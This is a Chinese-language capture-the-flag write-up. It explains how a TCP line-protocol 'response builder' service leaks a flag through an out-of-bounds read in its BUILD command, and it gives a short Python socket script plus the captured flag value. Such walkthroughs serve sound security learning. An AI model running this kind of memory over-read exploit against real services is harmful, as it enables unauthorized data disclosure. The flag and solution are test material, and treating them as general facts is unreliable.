## 题目原文

> 一个基于 TCP 行协议的响应构造服务，支持设置响应体、添加响应头并构建导出完整响应。请分析其实现，找出可利用的内存安全缺陷并读取受保护的 flag。

## 题解

### 入口与指纹

容器只开放一个 TCP 端口。连上后横幅是 `200 responsd ready`。`HELP` 给出四条命令：`SETBODY`、`ADDHEADER`、`BUILD`、`QUIT`。没有 HTTP，一行一条命令，以换行结束。

### 关键观察

`BUILD` 并不只导出已设置的响应。它先打印 `body_len` 和 `headers`，然后把一块固定的头部表按原始字节打出来，前缀是 `hdrtab:`。这块表后面紧挨着 flag。

只执行 `SETBODY hello` 再 `BUILD`，`headers` 仍是 0，输出里已经有 flag。`ADDHEADER` 会回 `250 header added`，但下一次 `BUILD` 的 `headers` 计数和 `hdrtab` 内容都不变。所以泄漏点是 `BUILD` 对头部表相邻内存的过度读取，不是把超长头写进那张表。

### 利用链

```bash
T=$(head -1 .target)   # host:port
python3 - << PY
import socket
host, port = "$T".rsplit(":", 1)
s = socket.create_connection((host, int(port)), 6)
s.settimeout(2)
s.recv(4096)
s.sendall(b"SETBODY hello\\n")
s.recv(4096)
s.sendall(b"BUILD\\n")
print(s.recv(4096))
PY
```

`hdrtab:` 后面先是 16 个 0，然后是 flag。本次平台接受的值是 `flag{e693fd6b-c820-4e5a-97bc-70dc40677ea2}`。

### flag 位置

进程里紧挨头部表的那一段内存。`BUILD` 把它和表一起送回来，不需要再去读文件。
